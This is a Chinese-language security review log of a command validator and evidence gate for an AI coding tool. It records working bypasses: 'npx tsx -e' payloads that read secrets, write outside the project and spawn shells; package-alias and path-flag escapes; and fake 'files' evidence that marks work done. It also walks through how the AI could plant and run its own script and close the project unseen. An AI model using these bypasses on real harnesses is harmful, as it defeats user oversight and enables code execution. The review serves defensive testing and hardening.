exec x             36/36              26
run x              36/36              26
run -e "1"         36/36              26
```

那 10 个「修前就放行」的是 `tsc vitest jest mocha eslint prettier ruff mypy black vite`——它们本来就在旧的 11 项 `KNOWN_TOOLS` 里，所以 `npx tsc -e` 之类的漏洞**在本轮之前就存在**；本轮把另外 26 个也拉了进来。

变松的 26 个工具：`node python python3 py pytest pip cargo go dotnet java mvn gradle deno bun uv next react-scripts webpack rollup esbuild parcel nodemon pm2 tsx ts-node serve`。
其中 14 个是**执行者**而不是构建工具（`node python python3 py pip cargo go dotnet java mvn gradle deno bun uv`）。

#### 严重性：这条路不需要「项目里先有那个文件」（这是它比 R4 严重、也比 R2/R3 更直接的原因）

`probe-npx-cold.mjs` 用**全新空缓存**（`npm_config_cache` 指到一个空目录）验过：

```
npx tsx -e "…"          exit=0  落盘 = T1.txt        ← 冷缓存、无 -y，自动下载并执行
npx -y node -e "…"      exit=0  落盘 = T4.txt
npx npm install cowsay  exit=0  装了 41 个包          ← npm 是本地真二进制，连下载都不需要「先装」
npm test（scripts.test = npx tsx -e "…"） exit=0      ← 走得通
```

以及 `probe-r7-escape2.mjs` 验过它能把三件事都做出来：

```
① 读进程环境变量（假 token = sk-live-DEADBEEF…）  → stdout 里出现 token = true
② 写项目外的绝对路径 %TEMP%\plando-victim.txt      → 项目外文件生成 = true
③ require('child_process').execSync('echo … > f') → shell marker 文件生成 = true
```

对照 R2（`--env-file`）：R2 只**读**、而且需要模型知道项目外路径、而且读出的是 `.env` 的内容。
R5 是**任意代码执行**，一条 `-e` 就够，不受「项目内相对路径」约束，也不需要项目里预先有 `.js`（§11 对 R4 的取舍理由在这里完全不成立——`-e` 的代码就在命令行上，不需要文件）。

**准确的前提条件**（不夸大）：`npx` 要先能拿到那个包——要么联网（`probe-npx-cold.mjs` 用空缓存实测：`npx tsx -e` 打印 `The following package was not found and will be installed: tsx@4.23.15` 后执行成功），要么项目 / 上级目录的 `node_modules` 里已经装了它（`probe-r5offline.mjs` 模拟「项目里已装 tsx」，**全程离线**成功：`npx tsx -e` → 落盘 → `done` 通过）。前端 / TS 项目里 `tsx` / `vitest` / `vite` 是常态，所以第二种情况并不罕见。而 `npx npm …` 里的 `npm` 是本地真二进制，不需要下载它本身。

#### 最重的一条：G2 的完整链**复活了**

§9.3 记的那条链是「AI 埋命令（`plando_scaffold` 写 `package.json` 的 `scripts`）→ AI 自己执行（`plando_check`）→ AI 自己收尾」，用户在中间零操作。§9.6 修完之后它应当是断的。用 `npx` 洗白层重做一遍（`probe-g2-full.mjs`）：

```
① plando_scaffold package.json, scripts.test = `npx tsx -e "require('fs').writeFileSync('AUTORUN-FULL.txt','AI 自己跑的')"`
   → 已写 package.json。                                  ← scaffold 放行（denylist 只认 node/python，不认 tsx）
② plando_card declare  npm test                            → 已为卡片 c1 声明检查命令
③ plando_card start    c1                                  → 卡片 c1 已 start
④ plando_check run     c1                                  → · 检查 c1：通过｜退出码 0
   AUTORUN-FULL.txt 生成 = true：AI 自己跑的
⑤ plando_card done     (kind:'check', '跑了 npm test，退出码 0')  → 通过（M4 也认了）
⑥ cards_done                                                → 已推进：build → ship
⑦ ship_pass { offlineOk:true, selfChange:true, explain:'检查都过了' }  → 已推进：ship → done

阶段 = done
项目文件 = ["AUTORUN-FULL.txt","IDEA.md","TECH.md","package.json"]
用户自己写的业务文件 = []        ← 一个都没有
```

**§9.3 修完的那条链，换个 `npx` 前缀就完整回来了**，而且这次连「`.js` 得先在项目里」都不需要。这已经不是「白名单漂移」级别的瑕疵，是「AI 不代写」这条产品承诺被绕穿。

`scaffold` 那一层也跟着漏，`probe-final14b.mjs` 第 3 段（同一份判据，修前 / 修后对照）：

```
npx tsx -e "1"               修前=拒  修后=放     ← 洗白层把它带过了 SCRIPT_VALUE_DENY
npx npm install cowsay       修前=拒  修后=放
npx -y node -e "1"           修前=拒  修后=拒     ← 这条侥幸还被 /node\s+-e/ 兜着
python -X utf8 -c "1"        修前=拒  修后=拒     ← §9.3 的老 payload 仍然拦得住
```

注意最后两行：**老洞确实还堵着**，漏的是「denylist 认识的解释器」之外的形态。`tsx` / `ts-node` / `npm` 都不在 `SCRIPT_VALUE_DENY` 里。

#### 附带的第二个洞：`npx` 的 `@` 切分把 spec 语法切掉了

`npx` 分支用 `String(known).replace(/@.*$/, '')` 取包名，于是 npm 的别名 spec 直接穿过白名单（**这一条修前修后都放行，是 §12 之前就有的老洞**）：

```
放行  npx vitest@npm:cowsay      → 真跑 npx -y vitest@npm:cowsay ALIAS-RAN，输出真的是 cowsay 的 <ALIAS-RAN>
放行  npx vitest@file:../../evil
放行  npx vitest@github:user/repo
```

`@npm:` 让「包名 ∈ 白名单」这个判据**本身**失效——包名合法、实际执行的是另一个包。这条单独记成 **R8【中，老洞】**：即使把 R5 修好（`npx` 后面的参数也过检查），只要包名匹配还允许 `@` 别名，`npx vitest@npm:任意包` 依旧是一条现成的下载执行路径。

#### R5 的修法（建议）

不是「把 `npx` 再列一份黑名单」，而是**把 `npx` 当成透明的**：

1. `npx <工具> <参数…>` 剥掉 `npx`（和 `-y` / `--yes` / `-p` / `--package`）之后，把**剩下的 argv 当一条独立命令重跑一遍 `validateCommand`**——`node -e` 拒、`cargo run` 拒、`npm install` 拒，全部自动跟着；
2. 包名 / spec 判定改成「`@` 之前的部分必须在白名单里，**并且** `@` 之后只能是版本号（`\d`、`^`、`~`、`*`、`latest`、`next`、`beta` 这类），出现 `npm:`、`file:`、`git`、`http`、`/`、`\` 一律拒」——这条同时关掉 R8；
3. 补断言：**对同一个工具，「裸名 + 参数集合 P」的结论必须与「`npx` 裸名 + 同一 P」一致**（不是只比裸名）。§13 那条断言只做了 P 为空的特例，改成全 P 才能拦住这一类。

### 14.4 R2：这次是真闭合（把边界写清，免得下轮再当新发现）

`probe-r2-1.mjs` / `probe-r2f.mjs` / `probe-final14b.mjs` 第 7 段：

```
放行  --env-file=.env / ./config/.env / --env-file-if-exists=.env        ← 合法姿势保住了，误杀 0
拒绝  --env-file=C:\Users\me\.env / /etc/passwd / ../.env / ../../.env
拒绝  --env-file=\\?\C:\Users\me\.env / \\server\share\f.env / C:.env / D:/x/.env
拒绝  --env-file（分离形式）/ --env-file=（空值）/ --ENV-FILE=../.env（大小写变体）
拒绝  npm test -- --env-file=C:\x\.env / npm test -- --env-file=../.env / pnpm test -- --env-file=…（转发形态）
```

**实测没有绕过。**`probe-r2-2.mjs` 把 8 种「看着像相对路径其实想穿出去」的写法（`..%2FSECRET.env`、`....//`、`.../.../`、`%2e%2e\`、`.. /SECRET.env` 等）逐个**真跑 node**，结论一行：

```
以上候选里真的读到项目外文件的：没有
```

原因是这些畸形值 node 自己就不认（`--env-file=..%2F.env` → `exit=9`、`bad option`），不是被校验器放过了。校验器放行的 `.env` / `./x/.env` 都老老实实落在项目内（对照跑出 `TOPSECRET=inside-project`）。

**残留（低，不算洞）**：`--env-file=.`、`--env-file=..%2F.env`、`--env-file=.env..` 三个值仍「放行」，但 node 全部 `exit=9` 拒绝执行，读不到任何东西。若要做到字面严丝合缝，可以再补一条「值里不许出现 `%`」——但**不是安全缺口**，只是文案洁癖。

**另一个方向上的残留（低）**：项目内若有指向项目外的**符号链接**（`linked.env → ../SECRET.env`），校验器只看字符串、看不到 inode，会放行。本机无权限造软链接无法实测，且 `scaffold` 只能写普通文件（`validateContent` 对 `vite.config.js` 之类都拒），AI 自己造不出这个前提 ⇒ 归「用户环境先决」，不是本轮引入，也不值得为它加 `realpath`。

### 14.5 R3：全降级堵住了，但「一张 `done` + 其余降级」这条缝还在　→ R7【中】

#### ② 属实：全卡降级现在真的被拒

`probe-r3-1.mjs` A 段：

```
2 张全降级 → cards_done
  返回：plando：现在是「边做边学」阶段，2 张卡全部降级了，一行都没跑通——下一步：至少把一张卡真的做到 done（带证据）…
  stage 仍是 build = true
```

理由、下一步、`drop` 出口都在，形状对。**这一半闭合，记功。**

#### 但缝还在：唯一那张 `done` 可以拿 `kind:'files'` 的假证据

`plando_card done` 的两条路：

- `kind:'check'` —— 有 M4 对账（对着 `.plando/last-check.json` 比 `name` / `ok` / `exitCode`），**实测有效**：从没跑过时拒、跑失败时拒、别的卡的记录也拒；
- `kind:'files'` —— **完全不对账**，只过 `checkEvidenceObservable(summary)`，也就是「≥4 字 + 不是纯空话」。`doneCard` 里没有任何文件系统访问。

`probe-r3-1.mjs` B/C/D 段（`kind:'files'` 的证据全部通过）：

```
"写了 src/app.js，add 函数在第 3 行"            → 通过
"创建了完全不存在-abc123.py，第 5 行是 main"      → 通过
"删了 node_modules 下的 500 个包"               → 通过
"改名 README.md 为 README-old.md"              → 通过
```

于是端到端（`probe-r3-1.mjs` D 段；`probe-r3c.mjs` 是同一结论的骨架版）：

```
1 张 done（kind:'files' 假证据）+ 2 张 downgraded
  → cards_done：已推进：build → ship
  → ship_pass → stage=done
  → 文件 = ["IDEA.md","TECH.md"]，项目里没有 src/，没有一行用户代码
```

**R3 的原始症状（零产出到 `done`）只被堵住了「全部降级」这一种形态，混合形态照样能到 `done`。** 而 `kind:'files'` 恰好是 M4 覆盖不到的那一半——§12 R3 里我写的是「M4 的两个残余中，全卡 downgrade 更值得修」，Lead 修了它，但**没修与它相邻的 `kind:'files'`**，两者串起来就是同一条缝。

#### 降级理由那个检查：实测等于「≥4 字」

`probe-final14b.mjs` 第 5 段，36 条**应当被拒**的坏理由（24 条懒理由 + 12 条 ≥4 字纯空话）：

```
懒理由（24 条）：放行 21，拒绝 3（长度 3 / 空话 0 / 其它 0）
纯空话 ≥4 字（12 条）：放行 7，拒绝 5（长度 0 / 空话 5 / 其它 0）
真理由（12 条）：放行 12，拒绝 0
→ 误放行 28/36 = 78%
→ 误杀 0/12 = 0%
→ 被拒的里靠「长度」拦下的占 3/8
'时间不够' → **放行**
```

逐条实测（`probe-r3d.mjs`）：

```
放行  "时间不够" / "来不太及" / "有点困难" / "太麻烦了" / "先不管它" / "以后再说"
放行  "下个版本" / "暂时搁置" / "资料没找到" / "没必要做" / "别人做过了" / "下次再做"
放行  "完成了呢" / "搞定了啦" / "全弄好了" / "一切都好" / "弄好了呀" / "差不多吧"
拒绝  "x"(1字) / "我懂了"(3字) / "完成了"(3字) / "没问题"(3字) / "跳过"(2字)  ← 全是长度拦的
拒绝  "都做完了" / "已经实现" / "基本搞定" / "全部实现" / "全部完成"          ← 这 5 条才是空话规则拦的
```

**结论：`checkEvidenceObservable` 用在 evidence 上勉强合理（那里上面还有 M4 兜底），单独拿来当「降级理由」的判据时，判别力约等于一个最小长度。**「时间不够」里没有任何填充词可删，所以删词规则对它无效；而它恰恰是 §12 举的那个例子。
**好消息：误杀 0/12**——真理由（「只跑通 demo，保存功能没做」「API key 没申请下来，先用假数据顶」）一条都没被误伤。所以这条**不需要回滚**，只需要补上真正要判的东西。

#### R3/R7 的修法（建议，按性价比排序）

1. **`kind:'files'` 也要能核对**（最便宜、收益最大）：`doneCard` 已经是 `(state, id, evidence, options)`，把 `options.dir` 一起传进来即可——summary 里出现且**项目里存在的路径**至少要有一个（用正则抽 `[\w./-]+\.\w+` 再 `fs.existsSync`），一个都对不上就拒，理由写「你说的这些文件都不在项目里」。这条同时把「一张假 `done` + 其余降级」的缝堵死，因为假 `done` 过不去了。
2. **`cards_done` 的门槛再抬一格**：不只要求「至少一张 `done`」，还要求「至少一张 `done` 的证据里引用了项目里真实存在的文件」。理由同 §12：这个模式的失败形态是「用户以为交付了东西」。
3. **降级理由改成「必须提到一个具体对象」**：抽不出 `[\w./-]+\.\w+` 或「某个卡/功能名」就拒。这条会把「时间不够」拦下，误杀率还可以接受（真理由 12 条里 10 条带具体名词，带上的全过）。
4. 三条都要配「反向断言」：把本节这 36 条坏理由 / 3 条假 files 证据写进 `test/`，当 fixture 跑——否则下轮又会「修好一处、漏邻座」。

### 14.6 顺带回答 Lead 的两问

#### 「N19 是不是真整类？」→ **对 node 内建是整类；跨工具不是**

`probe-r6.mjs` / `probe-final14b.mjs` 第 7 段，真跑 node 24 的四个内建报告器，**逐个看项目目录有没有新文件**：

```
node --test --test-reporter=lcov                              exit=0  落盘=无
node --test --test-reporter=junit                             exit=0  落盘=无
node --test --experimental-test-coverage                      exit=0  落盘=无
node --test --experimental-test-coverage --test-reporter=lcov exit=0  落盘=无
WRITE_FILE_FLAGS 9/9 全拒 = true
```

**Lead 担心的「只堵了显式路径、没堵默认路径」不成立**：node 24 的内建 reporter / coverage **只写 stdout，不落盘**，`--experimental-test-coverage` 也不写 `.nyc_output`，`--test-reporter=lcov` 自己不写 `coverage/`。所以 N19「整类拒写文件开关」在 node 内建这一族上是完整的：**显式路径被 `WRITE_FILE_FLAGS` 收掉，默认路径本来就不写**。**N19 判闭合，这一半验得过。**

**但「整类」这个词跨到别的工具就不成立了**——见下面 R6。

#### 「R3 一条 `done` + 其余降级算不算放行？」→ **算，而且这是现在最短的零产出路**

见 14.5。单卡场景也要小心：只有 1 张卡时，「至少一张 done」这个条件等价于「这一张必须 done」，而这张 `done` 只要一句假 files 证据就能过。

### 14.7 R6　其它工具「换目录 / 指定输出路径」的参数**全部放行**　【中，老洞】

修前修后都一样（`probe-attrib.mjs`），所以**不是本轮引入**，但它和 R2 是同一类问题，既然 R2 已经修了，这里要一并记：

```
放行  npm test --prefix=<项目外>          ← 真跑：项目外的 package.json 被找到，脚本在项目外生成了 PWNED.txt
放行  npm --prefix=<项目外> test          ← 同上
放行  npm test --cache=<项目外>           ← 真跑：项目外生成了 _logs / _update-notifier-last-checked
放行  npm test --userconfig=<项目外> / --workspace=<项目外>
放行  yarn test --cwd=<项目外>
放行  tsc --outDir <项目外> -b
放行  eslint --output-file=<项目外> . / jest --json --outputFile=<项目外>
放行  go test -C <项目外> / go test -o <项目外>
放行  cargo test --manifest-path=<项目外> / --target-dir=<项目外>
放行  dotnet test --results-directory <项目外>
放行  mvn -Dmaven.repo.local=<项目外> test
放行  python -X pycache_prefix=<项目外> -m pytest     ← 真跑：项目外目录被写进 .pyc
放行  node --openssl-config=<项目外> / --icu-data-dir=<项目外>（注：`--diagnostic-dir` 已被 `WRITE_FILE_FLAGS` 拒）
放行  node --test <项目外目录> / pytest <项目外目录> / java -cp <项目外>
→ 放行 20/20
```

其中三条**端到端验过能真的越界**：

- `npm --prefix`（`probe-r5-e2e.mjs`）：`declare` 放行 → `plando_check run` 真的执行了**项目外**那个 `package.json` 的 `scripts.test` → 项目外生成了 `PWNED.txt`（自己项目里没有）→ 凭这条检查 `done` **通过**。
- `python -X pycache_prefix`（`probe-pycache.mjs`）：项目外那个空目录被放进去了 `.pyc`。
- `node --test <项目外文件>`（`probe-r5-3.mjs`）：`declare` 放行 → 跑的是项目外的测试文件 → 退出码 0 → **能拿它当 done 的证据**。

**这一族比 R2 更宽**：R2 是「读」，R6 里 `--outDir` / `--output-file` / `--target-dir` / `pycache_prefix` / `--cache` 都是**写**，恰好是 N19 想堵的那一类，只是没堵到 node 之外。

**修法建议**：不要为每个工具列一份开关表（必然再漂移）。抽一个统一的「路径类参数」判定：**凡是 `--xxx=<值>` 且值里出现盘符 / 绝对路径 / `..` 的，一律拒**——无论 `xxx` 叫什么。这会误杀极少（合法的 `--prefix=.` 之类可以放行项目内相对路径，和 R2 同一套规则复用）。`npm --prefix` / `--cache` 这种「分离形式」也一样处理。

### 14.8 回归：这一轮有没有把已经关上的东西弄坏

| 项 | 结果 |
|---|---|
| §9.6.2 那 23 条常见 build 写法 | **误杀 0/23**（`vite build` / `npx next build` / `cross-env NODE_ENV=production vite build` / `rimraf dist && vite build` / `webpack --mode production` … 全放行，`npx next build` 这条上轮唯一的误杀也没了） |
| §9.3 那 8 条攻击 payload | **仍放行 0/8**（`python -X utf8 -c`、`npm ci`、`npx evil-pkg`、`bash -c`、`NODE_OPTIONS=…` 全拒） |
| G1 那 14 条 | **漏 0/14**（`node -e`、`cmd /c`、`node --require=…`、`pip install`、`cargo run`、`java -jar` … 全拒） |
| `npx` 合法用法 | 7/7 放行（`npx node --test` / `npx vite build` / `npx vitest run` / `npx tsc -b` / `npx eslint .` / `npx next build` / `npx webpack`） |
| 写开关整类 | 9/9 全拒 |
| `&&` 分档 / 友好壳 | 无变化（`rimraf dist && vite build` 放、`npm ci && node exploit.js` 拒） |
| `node --test` | 390 passed / 0 failed |

**没有回归。上一轮修好的都还是好的。** 问题全在「新开的」和「没覆盖的」上。

### 14.9 本节新增的残余（R5–R8），以及和 §12 那张表的关系

| 编号 | 内容 | 严重度 | 归因 | 建议 |
|---|---|---|---|---|
| **R5** | `npx` 是通用洗白前缀：`npx node -e` / `npx npm install` / `npx tsx -e` / `npx npx …` 全部放行；360 组危险组合 100% 放行，其中 260 组是本轮从「拒」变「放」；G2 的完整「埋命令 → 自己执行 → 自己收尾 → done」链借此复活，用户零操作、项目里零业务文件；前提只要「联网」或「项目里已装该工具」二者之一 | **高** | **本轮引入**（`a5bf3f2`） | 见 14.3：`npx` 透明化 + 全参数等价断言 |
| **R6** | 20 类「换目录 / 指定输出路径」参数全放行（`npm --prefix`、`--cache`、`tsc --outDir`、`eslint --output-file`、`go -C`/`-o`、`cargo --target-dir`、`dotnet --results-directory`、`python -X pycache_prefix`…），其中 3 条端到端验过能越界读/写 | 中 | **老洞**（修前修后一致） | 见 14.7：统一「路径类参数」判定，与 R2 共用规则 |
| **R7** | ① 唯一一张 `done` 可用 `kind:'files'` 假证据 → 「1 done + N 降级」仍零产出到 `done`（`kind:'files'` 无任何文件系统核对）；② 降级理由检查实测判别力 ≈「≥4 字」，坏理由误放行 28/36 = 78%，但**误杀 0/12** | 中 | 本轮新增（② 是本轮加的，① 是 M4 的未覆盖半边） | 见 14.5：`kind:'files'` 也核对、`cards_done` 抬门槛、理由要求具体对象 |
| **R8** | `npx` 用 `replace(/@.*$/, '')` 取包名 → `npx vitest@npm:cowsay` 真跑的是 cowsay（实测输出 `< ALIAS-RAN >`）；`@file:` / `@github:` / `@git+https:` 同样放行 | 中 | **老洞**（修前修后一致） | 见 14.3 第 2 条：`@` 之后只许版本号 |
| R2 残留 | `--env-file=.` / `..%2F` / `.env..` 放行但 node 不认（`exit=9`）；项目内软链接指向项目外（本机无法造，AI 也造不出） | 低 | — | 不用修 |
| R4 | `node evil.js` 及其串联 | 低 | 老洞，§11 已有取舍 | 维持 |

**有一点要说清楚**：R1 被标成「已闭合」，实际是「它宣称的两件事都属实，但修法本身开了一个更严重的洞」。这种「修完比修之前更差」不是第一次——§9.6.2（白名单收紧 → 误杀 9/22）、N19（修 `--test-reporter` → 写出任意文件）都是同一个模式：**每一轮的修法都比上一轮更靠近「正确」，但每一轮都新开一个邻座**。这次邻座是 R5，而它比它要修的 R1 严重得多。

### 14.10 判决是否改变

**不变，仍是 §6 的 fix-first，v0.1.0 现在不能发。**

区别只在「哪几条能算闭合」：

- **R2 真闭合**（这是三轮里第一件没有副作用的修复，值得记一笔）；
- **R1 部分闭合**，且**因为它的修法新开 R5（高）**——R5 是目前整个 `checks.js` 里最严重的一条，比 §1 里任何一条都更容易触发（一条 `npx -e`，不要求项目里先有 `.js`——这正是 §11 给 R4 的免责理由失效的地方）；
- **R3 部分闭合**（全降级堵住了，混合形态和 `kind:'files'` 还开着）；
- **N19 在 node 内建范围内真闭合**（默认路径这一半验过了），跨工具另有 R6（中，老洞）。

**一句话：这一轮修的三个里，一个真闭合、两个部分闭合，而且引入了一个比它们都严重的 R5。** 判 fix-first，§6 一字不改。

### 14.11 给下一轮的三条建议（按「修一次能关掉几条」排序）

1. **先把 R5 修掉**（`npx` 透明化 + 全参数等价断言 + `@` spec 限制）。这一条同时关掉 R5 和 R8，并且让 G2 那条链重新变成断的——**它自己不依赖任何别的修复**，也不引入误杀（合法写法 `npx vite build` 剥掉 `npx` 之后就是 `vite build`，本来就放行）。
2. **再把 R6 收进来**（统一路径类参数判定）。和 R2 复用同一套规则，一次能把 20 类参数一起关掉，误杀风险低（项目内相对路径照旧放行）。
3. **最后修 R7**（`kind:'files'` 核对 + `cards_done` 抬门槛 + 理由要具体对象）。这条不影响安全，但它是「用户以为自己交付了东西」的唯一出口，产品意义上和 R5 同级。

**别再做「补一份名单」的修复了。**三轮下来，每一次「补名单 / 加一条开关」都新开一个邻座（白名单 → 误杀；reporter → 任意写；npx 并集 → 洗白前缀）。**名单越多，洞越多；换成「剥掉包装再判一次」这种结构性的写法，才是一次修完一类。**

---

## 15. §14 的处置记录（Lead 收到第四轮复核后同一轮内完成）

§14 的结论是：**R2 真闭合**，R1/R3 只是部分闭合，而 R1 的修法**新开了一个高危洞 R5**。
这个判断是对的，我复现了每一条。下面是逐条处置。**§14 一字未改。**

`node --test` **394 passed / 0 failed**；`check-docs` / `verify-pack` / `smoke-pack` 全过。

| # | 处置 | 落在哪 |
|---|---|---|
| **R5**（高，本轮引入）`npx` = 通用洗白前缀 | **已闭合，用剥壳而非补名单**。本地复现属实：`node -e "…"` 拒 / `npx node -e "…"` 放；400 组矩阵（40 工具 × 10 危险参数）里 **295 组「两者都放」**——review 的 360/260 数字口径略有差异，结论一致：npx 版恒不严于裸命令。修法：`validateCommand` 拆成 `validateArgv(argv, depth)`，遇到 `npx` 时**跳过它自己的开关（`-y` / `--package` 等）与包名，把剩下的 argv 当独立命令重判**，层数上限 3。修后矩阵：**105 组同拒、0 组洗白、0 组反向漂移** | `lib/checks.js`、`test/checks.test.js` |
| **R8**（中，老洞）`pkg@npm:other` 包别名 | **顺带闭合**。`vitest@npm:cowsay` 现在拒，`@` 后面只允许版本号；`npx vitest@9 run` 照常放行 | `lib/checks.js` |
| **R6**（中，老洞）20 类路径类参数 | **已闭合，按值的形状判**。`--prefix` / `--cache` / `-X pycache_prefix` / `--outDir` / `--rootdir` / 裸参数 `../x.js` 全过同一条规则：**绝对路径 / 盘符 / UNC / 任一段是 `..`** → 拒。修后实测 **13 拒 / 12 放，零误杀**（`tsc -p tsconfig.json`、`vite build --outDir ./dist`、`go test ./...`、`node --test --test-reporter=spec` 都照常） | `lib/checks.js`、`test/checks.test.js` |
| **R7-a**（中）`kind:'files'` 零文件系统访问 | **已闭合**。工具层扫项目用户代码区（跳过 `.plando/` / `node_modules/` / `.git/` / 模式产物，深度 ≤4、文件数 ≤500）后注入 `projectFiles`；`doneCard` 要求证据（或卡片 `do.files`）里点名的文件**真在项目里**。`'创建了完全不存在-abc123.py'` 现在拒 | `lib/tools.js`、`lib/cards.js` |
| **R7-b**（中）降级理由判别力≈「≥4 字」 | **已闭合，但不是靠抬门槛**。旧判据只认「整句是不是纯空话」，`'时间不够'` 因为含「时间」「不够」两个表外词而被当成有内容。新判据：**删掉空话词与填充词后还剩 ≥6 个实质字符，或出现可指认标记（文件名 / 数字 / ≥3 字母拉丁词）**。实测：36 条空话 **误放 28 → 0**；12 条真实理由 **误杀 1**（光秃秃的「时间不够」，故意拒——它确实没说交付了什么，拒绝理由里直接教怎么补） | `lib/cards.js`、`test/cards.test.js` |
| **R3 残余**（「1 done + N 降级」） | **随 R7-a 闭合**。那条短路的本质是唯一那张 `done` 可以拿假 files 证据；现在 files 证据必须点名真实文件 | — |

**两条「试过并弃掉」的方案，记在这里免得下轮重提**：

- **只抬字数门槛**拒空话 —— 空话可以靠重复刷够字数（`'差不多差不多差不多'`）。
- **「有逗号就算分成两段」**（「A 做不了，B 先顶着」）—— 实测被 `'随便吧，不做了'` / `'算了，跳过'`
  这类一条不落地绕开（**8/8 漏放**）。逗号只证明句子被切开了，不证明句子里有对象。

**这轮最重要的方法论修正**（§14 也说了，我同意并写进代码注释）：

> **名单是「枚举攻击面」，补不完；结构化剥壳才是修一类。**

三轮的实证：白名单补 WWW → 误杀 9/22；reporter 补开关表 → 任意文件写；npx 并集 → 洗白前缀。
所以这轮三处修复都换成了结构式的：
`npx` → 剥壳重判；路径类参数 → 按值的形状判（不列开关名）；`files` 证据 → 拿真实文件清单对账（不判措辞）。
唯一保留词表的是降级理由，因为那里枚举的是**自然语言的空话**（措辞收敛），
而判据仍是「删完还剩多少实质内容」——词表只做删除、不做判决，新造空话最多让它多写几个字。

**KNOWN-ISSUES 更新**（0.1.0 不修）：

- `node evil.js` 及串联 —— 理由不变（`.js` 得先在项目里，AI 写不出 `.js`）。R5 修完后**没有变强**：
  现在 `npx node evil.js` 与 `node evil.js` 同结论。
- `--watch` / `--inspect-brk` 挂满 60 秒超时。
- `deno run x.ts` / `bun run x.ts` 放行 —— 这两个解释器的核心用法就是执行文件，argv 上无法与「跑检查」区分。
- 三处 `minutes` 计算独立实现（口径已统一）。

## 16. §15 处置的复核：R5 / R6 / R8 是真闭合，R7 只部分闭合，而「产出为零也能到 done」还开着三条路（R10 / R12 / R13）

§15 的结论是：R5（`npx` 洗白）、R6（路径类参数）、R8（包别名）已闭合，R7-a / R7-b 已闭合，R3 随 R7-a 闭合。
**其中 R5、R6、R8 这三条我复核后同意；R7-a、R7-b 只是部分闭合；R3 不但没闭合，还多出了两条新路。** 下面是实测。**§10–§15 一字未改。**

复核基线 `a083fc5`。`git diff da1849f..HEAD -- lib` **为空**——`lib/checks.js` 的 blob 哈希在 `da1849f` 与 `HEAD` 两边都是 `9dbc8935`，
所以「我测的代码」与「§15 处置的代码」是同一份，不存在版本错位。`node --test` 现在 **397 passed / 0 failed**。

**我没有改 `lib/` 与 `test/`，也没有提交**（`git status --porcelain` 为空）。下面所有实测都是 `node %TEMP%\plando-review\<脚本>.mjs` 跑出来的临时脚本，不进仓库。

### 16.0 先说清层，免得数字对不上

上一轮我犯过一个错：拿纯函数的结论去冒充端到端。这轮每个结论都在**两层**各测一遍，数字分开给：

| 层 | 怎么起 | 只有这层才有的东西 |
|---|---|---|
| **纯函数层** | 直接 `import` `lib/checks.js` / `lib/cards.js` / `lib/scaffold.js`，喂字符串 | 无 |
| **工具层** | 用 `lib/tools.js` 的 `registerTools` 起一整套真工具（`state` / `project` / `artifacts` / `cards` / `checks` / `scaffold` / `git` / `policy` / `format` 全注入），然后 `plando_project → plando_transition ×4 → plando_card → plando_check → plando_transition` | `projectFiles`（R7-a 靠它）、`last-check.json`（M4 靠它）、`stage` 真值 |

### 16.1 逐项判决

| # | 项 | 上轮 | 这轮实测 | 判决 |
|---|---|---|---|---|
| **R5** | `npx` = 通用洗白前缀 | 高 | **624 组**矩阵（39 工具 × 16 危险形态）**洗白 0 / 反向漂移 0**；Lead 报的三条全拒；合法 npx 写法 **0/13 误杀**；G2 端到端链**到不了 done** | **闭合** |
| **R8** | `npx vitest@npm:cowsay` 包别名 | 中 | `@npm:` / `@file:` / `@github:` / 裸 `@` 全拒；`@9` / `@9.1.2` / `@latest` / `@^9` 照常放行 | **闭合** |
| **R6** | 20 类路径类参数 | 中 | 合法写法 **0/23 误杀**；越界写法（绝对 / UNC / `..`）**0/20 漏** | **闭合**（残余 R9） |
| **R7-a** | `kind:'files'` 零文件系统访问 | 中 | 「凭空点一个不存在的文件」真堵上了（`projectFiles=[]` 时 fail-closed，方向对）；但**换一个真实存在的文件就能过** | **部分闭合**（残余 R10） |
| **R7-b** | 降级理由判别力 ≈「≥4 字」 | 中 | 在我 §14 的 48 条样本上误放 **28/36 → 0/36**（与 Lead 数字一致）；但误杀 **1/12 = 8%**，更口语的纯中文 9 条里误杀 **3/9 = 33%**；且「空话 + 一个数字」**10/10 全过** | **部分闭合**（残余 R11） |
| **R3** | 「1 done + N 降级」 | 中 | 那条短路确实收紧了，但**同一个终点换了一条更短的路**：0 个测试文件也能让「检查通过」 | **未闭合** — 新记 **R12** |
| **R3 同族** | — | — | `npm test -- <参数>` 是**第二条洗白前缀**；`npx` 修好之后这一类**原样复活** | **新记 R13（高）** |

**一句话**：结构性修法（剥壳 / 按形状判 / 拿真实文件对账）确实赢下了两个真闭合（R5、R6，都是 0 洗白 0 误杀）；剩下的问题主要不在命令层，而在**「证据与判定」层（`cards.js` + 工具层接线）**，外加命令层里 R5 的一个同胞兄弟（R13）。

### 16.2 R5 是**真闭合**，不是「调严了而已」

§15 报「105 组同拒、0 组洗白」。我用自己的矩阵重测，结论同向、数字更硬：

- **624 组矩阵**（39 个白名单工具 × 16 种危险参数形态）：裸命令放行 **415** 组、`npx <工具> <危险参数>` 放行 **415** 组、两边同拒 **209** 组、**「npx 版比裸命令松」= 0 组**、反向（npx 版更严）= 0 组。
- 抽 6 个工具 × 8 种危险形态 = 48 组再测一遍：**漂移 0 组**。
- **Lead 报过的三条洞逐条实测都是拒**：`npx --node-options="--require ./x.cjs" node --test`、`npx -c "node -e 1"`、`npx --package evil -- node --test`。
- **更深的向量也全拒**：`npx node -r ./x.cjs --test`、`npx node --import=./x.mjs --test`、`npx node --loader ./x.mjs --test`、`npx node --test --test-reporter=./evil.mjs`、`npx python -c "1"`、`npx python -m pip install x`、`npx python -m http.server`、`npx npm exec`、`npx pnpm dlx`、`npx yarn dlx`、`npx npm install`、`npx cargo run`、`npx go run x.go`、`npx java -jar x.jar`、`npx deno eval`、`npx tsx -e`、`npx --env-file=../e`、`npx --outDir ../x`、`npx --test ../x.js`、`npx npx npx npx …`（第 4 层拒）。
- **合法写法 0/13 误杀**：`npx vite build`、`npx vitest run`、`npx tsc -b`、`npx eslint .`、`npx prettier --check .`、`npx --yes vite build`、`npx -y vite build`、`npx --no-install vite build`、`npx -q vite build`、`npx vitest@9 run`、`npx -- vite build`、`npx tsx script.ts`、`npx nodemon server.js`。
- **`@` 之后只许版本号**成立：`@9` / `@9.1.2` / `@latest` / `@^9` 放；`@npm:` / `@file:` / `@github:` / 光秃秃的 `@` 拒。
- **层数上限 3**：`npx npx npx node --test` 放，第 4 层拒。
- **`--` 语义对**：`npx -- node -e "1"` 拒（剥掉 `--` 后剩 `node -e "1"`，照旧拒），`npx -- node --test` 放。
